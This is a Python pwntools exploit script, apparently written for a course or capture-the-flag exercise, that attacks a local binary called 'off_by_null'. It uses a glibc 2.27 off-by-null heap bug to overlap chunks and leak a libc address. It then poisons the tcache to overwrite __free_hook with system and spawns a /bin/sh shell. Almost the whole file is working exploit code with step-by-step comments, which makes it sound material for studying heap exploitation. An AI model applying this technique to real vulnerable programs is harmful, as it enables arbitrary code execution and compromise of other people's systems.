#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    gdbscript += 'set debug-file-directory /root/comp3633/tcache/debug'
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s

elf = ELF('./off_by_null')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./off_by_null")




## [Glibc 2.27 Off By null Attack Roadmap]
## 1. Modify pre_size field and pre_in_used bit to construct overlapped heap chunk to leak libc address
## 2. Again, use the overlapped heap chunk to modify fd of tcachebin
## 3. Modify free_hook to system




## ---------------------- [Step 1] -------------------------- ##
## Prepare heap chunk for attacking
## Size of chunk_1 is 0x28, this is to make sure that the pre_size field is overlapped with chunk_0
alloc(0, 0x600)
alloc(1, 0x28)
alloc(2, 0x5f0)
alloc(3, 0x10)


## Free chunk_0 (This is to bypass security check "chunk->bck->fd == &chunk && chunk->fd->bck == &chunk")
## See detail in
free(0)


## Modify the pre_size field of chunk_2 to be 0x640 (chunk_0), and off_by_null will modify the pre_in_used bit to zero
read(1, "a" * 0x20 + p64(0x640))


## Now free chunk_2, it would be merged with chunk_0 and chunk_1, then inserted into unsorted bin
free(2)


## Alloc 0x600 size heap chunk, unsorted bin would be cut down by 0x600 bytes (exactly is chunk_0)
## Also, the remaining chunk would remain in unsorted bin (chunk_1 would be header of unsorted bin)
alloc(4, 0x600)
leak_addr = u64(write(1) + "\x00\x00")


## Calculate system and free_hook address
libc_base = leak_addr - 0x3ebca0
system_addr = libc_base + 0x4f420
free_hook_addr = libc_base + 0x3ed8e8






## ---------------------- [Step 2] -------------------------- ##
## chunk_5 would be overlapped with chunk_1
alloc(5, 0x28)


## Free chunk_1
## tcachebin(0x30) -> chunk_1
free(1)


## Modify fd of chunk_1 via chunk_5
## tcachebin(0x30) -> chunk_1 -> free_hook
read(5, p64(free_hook_addr) + "\n")


## chunk_6 would be overlapped with chunk_1
## tcache_bin(0x30) --> free_hook
alloc(6, 0x20)


## chunk_7 would be overlapped with free_hook
alloc(7, 0x20)





## ---------------------- [Step 3] -------------------------- ##
## Modify free_hook to be system
read(7, p64(system_addr) + "\n")


## The below operation would be system("/bin/sh")
read(6, "/bin/sh\n")
free(6)
p.interactive()